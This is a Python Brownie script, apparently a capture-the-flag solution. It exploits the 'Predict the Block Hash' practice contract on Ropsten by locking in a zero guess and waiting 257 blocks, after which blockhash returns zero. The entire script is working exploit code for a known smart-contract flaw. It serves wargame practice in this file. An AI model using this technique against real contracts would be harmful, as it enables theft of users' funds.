import time
from brownie import (
    network,
    accounts,
    config,
    interface,
    chain,
    Contract,
    PredictTheBlockHashChallenge
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
    get_web3
)
from web3 import Web3


def main():
    player = get_account("player")
    challenge_contract = get_challenge_contract(
        PredictTheBlockHashChallenge, "predict_the_block_hash", [], {"from": player, "value": Web3.toWei(1.0, "ether")}
    )

    tx = challenge_contract.lockInGuess(0, {"from": player, "value": Web3.toWei(1.0, "ether")})
    tx.wait(1)

    wait_blocks(start_block_number=tx.block_number, num_blocks_to_wait=257)

    tx = challenge_contract.settle({"from": player})
    tx.wait(1)

    check_solution(challenge_contract.address)

def wait_blocks(start_block_number, num_blocks_to_wait):
    if network.show_active() == "ropsten-fork-dev":
        chain.mine(num_blocks_to_wait)
    elif network.show_active() == "ropsten":
        num_blocks_mined = 0
        while num_blocks_mined <= num_blocks_to_wait:
            num_blocks_mined = chain.height - start_block_number
            print(f"Waiting for blocks to get mined... Progress: {num_blocks_mined}/{num_blocks_to_wait}")
            time.sleep(10)